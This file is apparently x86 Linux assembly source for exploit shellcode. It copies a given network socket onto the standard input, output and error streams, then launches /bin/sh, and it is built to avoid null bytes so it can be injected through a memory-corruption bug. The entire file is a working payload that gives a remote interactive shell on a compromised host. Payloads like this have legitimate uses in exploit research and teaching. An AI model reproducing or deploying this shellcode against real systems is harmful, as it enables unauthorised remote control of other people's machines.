;
;	assemble with nasm sh.asm -o sh.bin -DSOCK=<sock_to_dup>
;	NOTE: UID must be at least 2 bytes long to avoid null byte

USE32

	section .data
	global _start

_start:
	xor eax, eax
	xor edi, edi
	xor esi, esi
	xor edx, edx
	xor ecx, ecx
	mov al, 0x10
	shl eax, 0x8
	sub esp, eax
	xor eax, eax
	xor ebx, ebx

	xor ebx, ebx
	mov bl, SOCK
dup0:
	xor ecx, ecx
	xor eax, eax
	mov al, 0x3f
	int 80h
dup1:
	inc ecx
	xor eax, eax
	mov al, 0x3f
	int 80h
dup2:
	inc ecx
	xor eax, eax
	mov al, 0x3f
	int 80h

	jmp shell
execve:
	pop ebx
	mov edi, ebx
	xor eax, eax
	mov al, 0x90    ; search for nop
	mov cl, 0xff    ; search up to 255 bytes
	cld
	repne scasb
	dec edi
	xor ecx, ecx
	mov [edi], cl   ; put the null byte

	mov dword [esp], ebx
	mov dword [esp + 4], ecx
	mov ecx, esp
	xor eax, eax
	mov edx, eax
	mov al, 0xb
	int 80h

shell:
        call execve
        db "/bin/sh"
end:
        nop	
